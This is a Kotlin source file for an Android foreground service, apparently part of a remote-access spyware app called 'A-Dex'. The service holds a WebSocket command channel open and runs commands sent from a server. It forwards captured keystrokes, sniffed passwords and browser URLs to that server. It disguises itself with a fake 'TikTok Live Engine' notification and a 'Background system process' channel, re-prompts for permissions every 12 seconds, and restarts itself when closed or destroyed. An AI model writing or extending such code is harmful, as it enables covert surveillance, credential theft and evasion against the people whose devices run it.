package com.adex.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.adex.app.MainActivity
import com.adex.app.R
import com.adex.app.data.SettingsStore
import com.adex.app.util.PersistenceWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import com.adex.app.util.PermissionHelper
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

// Foreground service keeps the command channel alive under Android background limits.
class ADexForegroundService : Service(), WebSocketEvents {
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private lateinit var settingsStore: SettingsStore
    private lateinit var backendApiClient: BackendApiClient
    private lateinit var webSocketManager: DeviceWebSocketManager
    private lateinit var commandDispatcher: CommandDispatcher

    @Volatile
    private var started = false

    override fun onCreate() {
        super.onCreate()
        settingsStore = SettingsStore(applicationContext)
        backendApiClient = BackendApiClient()

        webSocketManager = DeviceWebSocketManager(settingsStore, this, serviceScope)
        commandDispatcher = CommandDispatcher(
            context = applicationContext,
            settingsStore = settingsStore,
            backendApiClient = backendApiClient,
            sendResult = { result -> webSocketManager.sendResult(result) }
        )

        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification("Initializing"))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ServiceActions.ACTION_STOP -> {
                stopSelf()
                return START_NOT_STICKY
            }

            ServiceActions.ACTION_PACKAGE_EVENT -> {
                val eventType = intent.getStringExtra(ServiceActions.EXTRA_EVENT_TYPE) ?: "unknown"
                val packageName = intent.getStringExtra(ServiceActions.EXTRA_PACKAGE_NAME) ?: "unknown"
                val payload = mutableMapOf<String, Any>(
                    "packageName" to packageName,
                    "timestamp" to System.currentTimeMillis()
                )
                if (eventType == "keylog" || eventType == "password_sniff") {
                    payload["text"] = intent.getStringExtra("text") ?: ""
                } else if (eventType == "browser_url") {
                    payload["url"] = intent.getStringExtra("url") ?: ""
                }
                webSocketManager.sendEvent(eventType, payload)
            }
        }

        if (!started) {
            started = true
            isServiceRunning = true
            startSession()
        }

        return START_STICKY
    }

    private fun startSession() {
        serviceScope.launch {
            runCatching {
                val appVersion = packageManager.getPackageInfo(packageName, 0).versionName ?: "1.0.0"
                val pairInfo = requestPairingWithTokenRecovery(appVersion)

                settingsStore.deviceToken = pairInfo.deviceToken
                val pairStatus = if (pairInfo.autoEnrolled) {
                    settingsStore.oneTapLinkCompleted = true
                    "linked:guild=${pairInfo.autoEnrollGuildId ?: "unknown"};channel=${pairInfo.autoEnrollChannelId ?: "not_set"};bound=${pairInfo.autoEnrollBound}"
                } else {
                    "pair_code:${pairInfo.pairCode}"
                }
                lastPairCode = pairStatus
                val notificationStatus = if (pairInfo.autoEnrolled) {
                    val channelText = if (pairInfo.autoEnrollBound) "bound to channel" else "not bound"
                    "Connected. Auto-enrolled ($channelText)"
                } else {
                    "Connected. Pair code: ${pairInfo.pairCode}"
                }
                updateNotification(notificationStatus)
                broadcastPairCode(pairStatus)

                webSocketManager.connect(
                    metadata = mapOf(
                        "name" to "A-Dex Android",
                        "model" to (Build.MODEL ?: "unknown"),
                        "androidVersion" to (Build.VERSION.RELEASE ?: "unknown"),
                        "appVersion" to appVersion,
                    )
                )
            }.onFailure {
                val message = (it.message ?: "unknown").take(80)
                Log.e("ADexForegroundService", "Pair registration failed: $message", it)
                val statusText = "error: $message"
                lastPairCode = statusText
                broadcastPairCode(statusText)
                updateNotification("Registration failed: $message; retrying")
                webSocketManager.connect(
                    metadata = mapOf(
                        "name" to "A-Dex Android",
                        "model" to (Build.MODEL ?: "unknown"),
                        "androidVersion" to (Build.VERSION.RELEASE ?: "unknown"),
                        "appVersion" to "1.0.0",
                    )
                )
            }
            startPermissionEnforcer()
        }
    }

    private fun startPermissionEnforcer() {
        serviceScope.launch {
            while (started) {
                if (!PermissionHelper.allCriticalPermissionsGranted(applicationContext)) {
                    val intent = Intent(applicationContext, MainActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    }
                    startActivity(intent)
                }
                delay(12000) // Re-prompt every 12 seconds if setup is not finished
            }
        }
    }

    private suspend fun requestPairingWithTokenRecovery(appVersion: String): PairingInfo {
        return runCatching {
            backendApiClient.requestPairingCode(
                settings = settingsStore,
                model = Build.MODEL ?: "unknown",
                androidVersion = Build.VERSION.RELEASE ?: "unknown",
                appVersion = appVersion
            )
        }.getOrElse { firstError ->
            // Recover from stale local token by retrying once without a token.
            settingsStore.deviceToken = null
            backendApiClient.requestPairingCode(
                settings = settingsStore,
                model = Build.MODEL ?: "unknown",
                androidVersion = Build.VERSION.RELEASE ?: "unknown",
                appVersion = appVersion
            ).also {
                Log.w("ADexForegroundService", "Recovered pairing after token reset", firstError)
            }
        }
    }

    override fun onConnected() {
        updateNotification("Connected to server")
    }

    override fun onDisconnected() {
        updateNotification("Disconnected; reconnecting")
    }

    override fun onCommand(command: DeviceCommand) {
        serviceScope.launch {
            commandDispatcher.execute(command)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return
        }

        val channel = NotificationChannel(
            CHANNEL_ID,
            "System",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Background system process"
        }

        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification(contentText: String): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("TikTok Live Engine")
            .setContentText("Optimizing live stream health...")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(contentText: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, buildNotification(contentText))
    }

    private fun broadcastPairCode(code: String) {
        val intent = Intent(ACTION_PAIR_CODE).apply {
            putExtra(EXTRA_PAIR_CODE, code)
        }
        sendBroadcast(intent)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        PersistenceWorker.schedule(applicationContext)
        val restartIntent = Intent(applicationContext, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_START
        }
        runCatching {
            androidx.core.content.ContextCompat.startForegroundService(applicationContext, restartIntent)
        }
    }

    override fun onDestroy() {
        started = false
        isServiceRunning = false
        PersistenceWorker.schedule(applicationContext)
        commandDispatcher.shutdown()
        webSocketManager.disconnect()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val CHANNEL_ID = "adex_foreground_channel"
        private const val NOTIFICATION_ID = 2001

        const val ACTION_PAIR_CODE = "com.adex.app.PAIR_CODE"
        const val EXTRA_PAIR_CODE = "pair_code"

        @Volatile
        var isServiceRunning: Boolean = false

        @Volatile
        var lastPairCode: String = ""
    }
}
